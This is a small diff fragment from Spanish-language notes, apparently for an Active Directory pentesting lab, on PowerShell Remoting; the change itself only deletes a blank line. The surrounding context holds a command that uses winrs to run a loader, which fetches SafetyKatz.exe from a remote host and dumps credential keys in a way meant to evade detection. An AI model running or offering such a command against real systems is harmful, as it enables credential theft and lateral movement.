@@ -63,7 +63,6 @@ Piensa en Powershell Remoting (PSRemoting) como 'psexec' con esteroides pero muc
 
 ```powershell 
 # Extraer credenciales 
-
 ❯ winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://IP/SafetyKatz.exe sekurlsa::evasive-keys exit" 
 
 # La mejor manera para evitar bloqueos 
